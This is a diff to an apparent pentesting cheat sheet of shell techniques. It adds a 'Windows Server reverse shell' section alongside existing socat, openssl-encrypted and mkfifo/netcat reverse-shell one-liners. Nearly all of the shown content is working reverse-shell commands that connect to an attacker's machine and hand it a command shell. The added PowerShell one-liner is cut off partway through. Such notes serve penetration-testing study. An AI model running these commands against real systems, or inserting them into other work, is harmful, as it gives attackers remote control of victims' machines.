@@ -40,7 +40,7 @@ socat TCP:<lhost>:<lport> EXEC:powershell.exe,pipes
 # 'sane' stabilises the terminal, attempting to normalise it
 ```
 
-Encrypted reverse shell
+**Encrypted reverse shell**
 ```Bash
 # Generate a certificate on the attacking host in order to use encrypted shells
 openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt
@@ -59,6 +59,11 @@ socat OPENSSL:<lhost>:<rport>,verify=0 EXEC:/bin/bash
 ```Bash
 # Create a listener for a reverse shell (BRUH IDK)
 mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
+```
+
+**Windows Server reverse shell**
+```PowerShell
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<attacking_machine_address>',<attacking_machine_port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$send
 ```
 
 ## Spawning Bind Shells
